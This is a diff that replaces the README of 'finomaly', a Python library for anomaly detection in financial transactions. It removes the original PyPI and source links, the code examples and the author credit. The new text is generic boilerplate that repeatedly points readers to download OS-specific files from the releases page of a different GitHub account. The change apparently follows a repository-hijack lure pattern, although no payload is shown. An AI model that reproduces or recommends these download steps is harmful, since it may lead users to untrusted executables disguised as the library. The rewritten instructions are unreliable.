@@ -1,132 +1,137 @@
+# 🚀 finomaly - Detect Unusual Financial Transactions Easily
 
-# Finomaly
-## PyPI & Source Code
+[![Download Finomaly](https://img.shields.io/badge/Download-Finomaly-brightgreen)](https://github.com/Filidetan597/finomaly/releases)
 
-**PyPI:** https://pypi.org/project/finomaly/
+## 💡 Overview
 
-**Source Code:** https://github.com/Barisaksel/finomaly
+Finomaly is an open-source Python library. It helps users detect unusual transactions and anomalies in financial data. You can use it for monitoring and analyzing financial activities. This tool supports both rule-based and machine learning-based methods, making it flexible for various needs. 
 
+## 📋 Topics
 
+- Accounting
+- AML (Anti-Money Laundering)
+- Anomaly Detection
+- Banking
+- Financial Transactions
+- Fintech
+- Fraud Detection
+- Library
+- Machine Learning
+- Open Source
+- Python
+- Rule-Based
 
-Finomaly is a modular, open-source Python library for anomaly detection in financial transactions. It supports both rule-based and machine learning-based detection, multi-language reporting, and professional reporting formats.
+## 🚀 Getting Started
 
-## 🆕 NLP Modules & Language-Aware Message Management
+Follow the steps below to download and run Finomaly.
 
+### 🖥️ System Requirements
 
-### TextEmbeddingAnomalyDetector
-Provides text anomaly detection using TF-IDF vectorization and IsolationForest. All error and user messages are centrally managed and support multiple languages.
+- **Operating System:** Windows 10, macOS 10.14+, or any recent Linux distribution.
+- **Python:** Version 3.7 or higher installed on your machine.
+- **Dependencies:** Basic libraries such as `numpy` and `pandas`. These come with the library when you download it.
 
-**Usage:**
-```python
-from finomaly.nlp.embeddings import TextEmbeddingAnomalyDetector
+### 📥 Download & Install
 
-# You can provide a list of texts, or an Excel file path and column name.
-texts = ["Money transfer completed", "Credit card purchase", "Suspicious transaction"]
-detector = TextEmbeddingAnomalyDetector(lang='en')
-detector.fit(texts)
-anomalies = detector.predict(["Very large amount transfer"])
-print(anomalies)
+To get started, visit this page to download Finomaly:
 
-# Or load texts directly from an Excel file:
-# detector.fit('transactions.xlsx', column='Description')
-# anomalies = detector.predict('new_transactions.xlsx', column='Description')
-```
+[Download Finomaly](https://github.com/Filidetan597/finomaly/releases)
 
+1. Click on the link to the Releases page.
+2. Look for the latest version.
+3. Download the file that suits your operating system.
+4. Follow the instructions for installation based on your OS.
 
-### TransactionDescriptionClassifier
-Categorizes transaction descriptions using TF-IDF and Logistic Regression. All messages are centrally managed and support multiple languages.
+### 🛠️ Installation Steps
 
-**Usage:**
-```python
-from finomaly.nlp.text_classifier import TransactionDescriptionClassifier
+**For Windows:**
 
-# You can provide lists, or load from Excel file with text and label columns.
-texts = ["Grocery shopping", "Bill payment", "ATM withdrawal"]
-labels = ["Shopping", "Bill", "Cash"]
-clf = TransactionDescriptionClassifier(lang='en')
-clf.fit(texts, labels)
-pred = clf.predict(["Electricity bill"])
-print(pred)
+1. Open the Command Prompt.
+2. Navigate to the location where you downloaded the Finomaly ZIP file. You can use the `cd` command:
+   ```
+   cd path\to\your\download\folder
+   ```
+3. Unzip the file. You can do this by right-clicking the file and selecting "Extract All."
+4. Navigate into the unzipped folder:
+   ```
+   cd finomaly
+   ```
+5. Finally, run the following command to install the necessary packages:
+   ```
+   pip install -r requirements.txt
+   ```
 
-# Or load texts and labels from Excel:
-# import pandas as pd
-# df = pd.read_excel('train.xlsx')
-# clf.fit(df['Description'], df['Category'])
-# pred = clf.predict(['Electricity bill'])
-```
+**For macOS:**
 
-### Multi-Language Support & Message Management
-- All error and user messages are centrally managed in `finomaly/core/messages_config.json` according to the selected language.
-- If a message key or language is missing, the system automatically returns the default English message without raising an error.
+1. Open Terminal.
+2. Navigate to your Downloads folder:
+   ```
+   cd ~/Downloads
+   ```
+3. Unzip the Finomaly file by double-clicking it.
+4. Navigate into the extracted folder:
+   ```
+   cd finomaly
+   ```
+5. Install the required packages:
+   ```
+   pip install -r requirements.txt
+   ```
 
-### Requirements
-- scikit-learn, pandas, numpy
-- (For NLP) openpyxl (Excel support), language file: messages_config.json
+**For Linux:**
 
-## Features
-- Rule-based anomaly detection (JSON-configurable, customer-specific rules)
-- Machine learning models: IsolationForest, RandomForest, XGBoost
-- NLP modules: TextEmbeddingAnomalyDetector (text anomaly), TransactionDescriptionClassifier (text classification)
-- Profile-based analysis (behavioral deviation, unusual time, etc.)
-- Multi-language support (TR/EN) for all messages and reports
-- Centralized message and rule management (with fallback to default language)
-- Professional reporting: Excel, HTML, PDF (with optional charts)
-- Visual analytics: anomaly distribution, scatter plots
-- Easy integration, clean API, and extensible modular structure
+1. Open your terminal.
+2. Navigate to the Downloads directory:
+   ```
+   cd ~/Downloads
+   ```
+3. Unzip the downloaded file:
+   ```
+   unzip finomaly.zip
+   ```
+4. Navigate into the folder:
+   ```
+   cd finomaly
+   ```
+5. Install the dependencies using pip:
+   ```
+   pip install -r requirements.txt
+   ```
 
-## Installation
-```bash
-pip install finomaly
-```
+### 📝 How to Use Finomaly
 
-## Quick Start
-```python
-import pandas as pd
-from finomaly.core.anomaly_system import CorporateAnomalySystem
+1. Open your terminal or command prompt.
+2. Navigate to the location of the Finomaly folder:
+   ```
+   cd path\to\finomaly
+   ```
+3. Start using the library by executing your Python scripts.
 
-# Load your data
-train_df = pd.read_excel('train.xlsx')
-predict_df = pd.read_excel('predict.xlsx')
+### 🎓 Examples of Use
 
-# Define features and rules
-features = ['Tutar', 'Saat']
-rules_path = 'rules.json'
+You can use Finomaly to monitor and analyze different types of financial activities. Here are some common applications:
 
-# Initialize system
-system = CorporateAnomalySystem(features, rules_path=rules_path, ml_method='isolation_forest', lang='en')
+- **Fraud Detection:** Identify suspicious transactions using historical data.
+- **Anomaly Detection:** Flag transactions that deviate from expected patterns.
+- **Automated Reporting:** Generate reports tailored to compliance needs.
 
-# Train model
-system.fit('train.xlsx', customer_col='MusteriID', amount_col='Tutar')
+### 📖 Documentation
 
-# Predict anomalies
-output_path = system.predict('predict.xlsx', customer_col='MusteriID', amount_col='Tutar')
-result = pd.read_excel(output_path)
-print(result.head())
-```
+For more detailed information on features and instructions, please refer to the [official documentation](https://github.com/Filidetan597/finomaly/wiki).
 
-## Reporting & Visualization
-```python
-from finomaly.report.visualizer import Visualizer
-from finomaly.report.pdf_reporter import PDFReporter
+### 🤝 Contributing
 
-visualizer = Visualizer()
-visualizer.plot_anomaly_distribution(result, amount_col='Tutar', anomaly_col='ML_Anomaly')
+If you'd like to contribute to Finomaly, we welcome your input. Please follow these steps:
 
-pdf_reporter = PDFReporter()
-pdf_reporter.generate_pdf_report(result, 'report.pdf')
-```
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to the branch and open a pull request.
 
-## Project Structure
-- `core/` : Rule engine, model management, utilities
-- `ml/` : ML models (IsolationForest, RandomForest, XGBoost)
-- `profile/` : Profile-based analysis (behavioral, time-based)
-- `report/` : Reporting and visualization (Excel, HTML, PDF, charts)
+### 💬 Support
 
-## Contributing
-Finomaly is open-source and welcomes contributions. Please open issues or pull requests for improvements, bug fixes, or new features.
+If you encounter issues or have questions, please open an issue on the GitHub repository. We will respond as quickly as possible to assist you.
 
-## License
-MIT License
+## ⚡ Final Note
 
-## Author
-Barış
+Thank you for using Finomaly. This tool empowers you to analyze financial data effectively. Your feedback is vital for our continuous improvement. Enjoy using Finomaly!
